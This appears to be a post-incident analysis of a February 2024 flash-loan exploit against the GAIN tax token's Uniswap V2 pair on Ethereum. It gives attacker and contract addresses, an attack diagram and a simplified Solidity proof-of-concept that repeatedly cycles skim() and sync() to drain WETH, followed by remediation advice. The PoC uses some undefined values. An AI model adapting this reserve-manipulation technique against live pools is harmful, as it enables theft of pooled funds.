# GAIN — Flash Loan-Based skim/sync Reserve Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | GAIN |
| **Chain** | Ethereum |
| **Loss** | ~18 ETH |
| **Attacker** | [0x0000000f](https://etherscan.io/address/0x0000000f95c09138dfea7d9bcf3478fc2e13dcab) |
| **Attack Contract** | [0x9a4b9fd3](https://etherscan.io/address/0x9a4b9fd32054bfe2099f2a0db24932a4d5f38d0f) |
| **GAIN Token** | [0xdE59b88a](https://etherscan.io/address/0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac) |
| **UniV3 USDT Pair** | [0xc7bBeC68](https://etherscan.io/address/0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b) |
| **UniV2 GAIN Pair** | [0x31d80EA3](https://etherscan.io/address/0x31d80EA33271891986D873B397d849A92EF49255) |
| **Root Cause** | Repeated use of `skim()` and `sync()` on the Uniswap V2 pair to desynchronize pair reserves, then profiting via a swap |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/GAIN_exp.sol) |

---

## 1. Vulnerability Overview

The GAIN token's transfer tax mechanism combined with Uniswap V2's `skim()`/`sync()` functions induces a reserve mismatch. The attacker flash-borrowed a small amount of WETH from Uniswap V3, transferred WETH into the V2 pair, and repeatedly cycled `swap()` → `skim()` → `sync()` to desynchronize the reserves, then extracted the remaining WETH.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: reserves can be manipulated via skim/sync combination
// Standard Uniswap V2 functions — interact with GAIN token tax
interface Uni_Pair_V2 {
    function skim(address to) external;      // sends excess balance to external address
    function sync() external;               // updates reserves to current balances
    function swap(uint, uint, address, bytes calldata) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

// GAIN token charges a tax on transfer → actual received amount < sent amount
// After skim() followed by sync(), reserves are set lower than actual balance
// This mismatch is amplified through repeated cycles to realize profit

// ✅ Safe code: avoid combining tax tokens with V2 pairs
// Or disable skim/sync and track reserves separately
function sync() external {
    // For tax tokens, use internal reserve tracking instead of direct balanceOf
    require(!isTaxToken(token0) && !isTaxToken(token1), "tax tokens unsupported");
    _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), ...);
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Uniswap V3 flash: flash loan 0.1 WETH
  │
  ├─→ [2] Transfer WETH → V2 GAIN pair
  │
  ├─→ [3] Execute V2 swap() (WETH → GAIN)
  │
  ├─→ [4] Call skim() — extract excess GAIN tokens
  │
  ├─→ [5] Call sync() — update reserves to lower actual balance
  │
  ├─→ [6] Repeat cycle to amplify reserve-balance mismatch
  │
  ├─→ [7] Final swap() to extract remaining WETH
  │
  ├─→ [8] Repay V3 flash loan (including fee)
  │
  └─→ [9] ~18 ETH profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface Uni_Pair_V2 {
    function skim(address to) external;
    function sync() external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface Uni_Pair_V3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract AttackContract {
    Uni_Pair_V3 constant v3Pool  = Uni_Pair_V3(0xc7bBeC68d12a0d1830360F8Ec58fA599bA1b0e9b);
    Uni_Pair_V2 constant v2Pair  = Uni_Pair_V2(0x31d80EA33271891986D873B397d849A92EF49255);
    IERC20      constant GAIN    = IERC20(0xdE59b88abEFA5e6C8aA6D742EeE0f887Dab136ac);
    IWETH       constant WETH    = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function testExploit() external {
        // [1] Flash loan a small amount of WETH from V3
        v3Pool.flash(address(this), 0, 1e17, "");
    }

    function uniswapV3FlashCallback(uint256, uint256, bytes calldata) external {
        // [2] Transfer WETH to the V2 pair
        WETH.transfer(address(v2Pair), WETH.balanceOf(address(this)));

        // [3] swap: WETH → GAIN
        (uint112 r0, uint112 r1,) = v2Pair.getReserves();
        uint amountOut = calculateAmountOut(r0, r1);
        v2Pair.swap(0, amountOut, address(this), "");

        // [4] Repeat skim/sync cycle to manipulate reserves
        for (uint i = 0; i < 5; i++) {
            GAIN.transfer(address(v2Pair), GAIN.balanceOf(address(this)));
            v2Pair.skim(address(this));  // extract excess tokens
            v2Pair.sync();              // update reserves downward
        }

        // [5] Final swap to recover WETH
        v2Pair.swap(extractableWETH, 0, address(this), "");

        // [6] Repay V3 flash loan
        WETH.transfer(address(v3Pool), 1e17 + fee);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | skim/sync reserve desynchronization manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + abuse of standard DEX functions) |
| **DApp Category** | Tax token + Uniswap V2 pair |
| **Impact** | WETH drained via pair reserve manipulation |

## 6. Remediation Recommendations

1. **Avoid tax tokens in V2 pairs**: Refrain from combining tokens with transfer taxes with Uniswap V2
2. **Disable skim**: Disable the `skim()` function in pairs involving tax tokens
3. **Internal reserve tracking**: Manage state using internal reserve variables instead of `balanceOf()`
4. **Tax rate limit**: Excessive transfer taxes amplify reserve mismatches — minimize the tax rate

## 7. Lessons Learned

- Combining tax tokens with Uniswap V2's `skim()`/`sync()` creates an attack vector for reserve desynchronization.
- A structure where reserves fall below actual balances after `sync()` is called can be amplified through repeated cycles.
- When listing tax tokens on a DEX, compatibility with standard AMMs must be thoroughly verified.